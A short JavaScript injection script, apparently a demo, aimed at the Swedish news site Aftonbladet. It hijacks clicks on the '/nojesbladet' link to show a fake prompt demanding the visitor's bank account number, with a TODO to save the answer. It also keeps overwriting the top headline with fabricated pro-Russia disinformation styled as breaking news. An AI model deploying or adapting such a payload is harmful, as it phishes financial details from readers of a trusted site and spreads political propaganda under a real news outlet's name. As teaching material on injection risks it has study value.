// Add code to inject here
console.log('The injection script works!');

// Listening on clicks on all links
document.body.addEventListener('click', event => {
  // get an a tag if that is what is clicked
  let aTag = event.target.closest('a');
  // if not an a tag then do nothing
  if (!aTag) { return; }
  // read the href attribute
  let href = aTag.getAttribute('href');
  console.log('You clicked', href);
  // do something else than Aftonbladet
  // if you click the menu link "/nojesbladet"
  if (href === '/nojesbladet') {
    // prevent the link from its normal behavior
    event.preventDefault();
    let accountNumber = prompt('Fr.o.m. nu måste du ange ditt bankkontonummer för att få se Nöjesbladet!');
    console.log(accountNumber);
    // TODO: Save the info from the user...
  }
});


// A fake heading with disinformation
let disinformationHeadlineContent = `
  <span class="hyperion-css-43tyjz">JUST NU: </span>
  Ryssland är världens snällaste och fredligaste land!
`;

// For now: Since the heading seem to change back to 
// original during page load - set it repeatedly with
// 200 ms intervals... until it seems stable
setInterval(() => {
  // Change the first heqding
  let firstHeadline = document.querySelector('h1[data-test-tag="headline"]')
    || document.querySelector('h2');
  if (firstHeadline.innerHTML !== disinformationHeadlineContent) {
    firstHeadline.innerHTML = disinformationHeadlineContent;
  }
}, 200);